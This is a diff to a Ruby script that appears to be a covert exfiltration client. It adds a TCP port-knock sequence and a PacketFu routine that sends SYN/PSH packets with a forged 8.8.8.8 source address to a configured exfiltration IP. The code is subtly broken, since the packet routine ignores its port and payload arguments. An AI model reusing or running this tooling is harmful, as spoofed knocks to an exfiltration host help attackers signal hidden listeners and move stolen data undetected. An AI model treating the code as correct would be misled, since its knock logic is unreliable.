@@ -240,10 +240,29 @@ def generate_knock_seq
       puts e.message
     end
   elsif $cfg_exfil_protocol == TCP
+    begin
+      3.times {
+        tcp_packet(iface_config, 33333, covert_config)
+        sleep 1
+      }
+      sleep 2
+      3.times {
+        tcp_packet(iface_config, 22222, covert_config)
+        sleep 1
+      }
+      sleep 2
+      3.times {
+        tcp_packet(iface_config, 33233, covert_config)
+        sleep 1
+      }
+      sleep 5
+    rescue Exception => e
+      puts "error in tcp knock"
+      puts e.message
+    end
   else
     #should not get here, protocol not implemented
   end
-      
 end
 
 # Crafts a UDP packet and sends to configured exfiltration IP.
@@ -277,7 +296,20 @@ end
 # @param [string] payload
 # - configuration to include for client
 def tcp_packet(config, port, payload)
+  tcp_pkt = PacketFu::TCPPacket.new(:config => config, :flavor => "Linux")
 
+  tcp_pkt.ip_daddr = $cfg_exfil_ip
+  tcp_pkt.tcp_dst = $cfg_exfil_port
+  tcp_pkt.tcp_src = rand(0xffff)
+  tcp_pkt.ip_saddr = "8.8.8.8"
+
+  tcp_pkt.tcp_flags.psh = 1
+  tcp_pkt.tcp_flags.syn = 1
+
+  tcp_pkt.recalc
+  tcp_pkt.to_w($cfg_iface)
+
+  puts "tcp packet sent #{$cfg_exfil_ip} on #{port}"
 end
 
 ## Main
